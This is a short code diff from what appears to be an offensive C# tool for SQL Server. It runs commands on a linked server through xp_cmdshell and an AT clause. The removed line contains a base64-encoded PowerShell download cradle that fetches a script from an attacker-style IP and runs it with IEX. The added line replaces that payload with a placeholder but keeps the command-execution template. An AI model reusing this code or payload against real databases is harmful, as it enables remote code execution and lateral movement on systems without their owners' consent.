@@ -516,7 +516,7 @@ namespace SQL
                 SqlDataReader reader = command.ExecuteReader();
                 reader.Close();
 
-                string execCMD = $"EXEC ('xp_cmdshell ''Powershell -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUANQAvAGQAbwB3AG4AbABvAGEAZABfAGMAcgBhAGQAbABlAC4AcABzADEAJwApACAAfAAgAEkARQBYAA==''') AT {sqlHost};";
+                string execCMD = $"EXEC ('xp_cmdshell ''Powershell -enc <command>''') AT {sqlHost};";
 
                 command = new SqlCommand(execCMD, con);
                 reader = command.ExecuteReader();
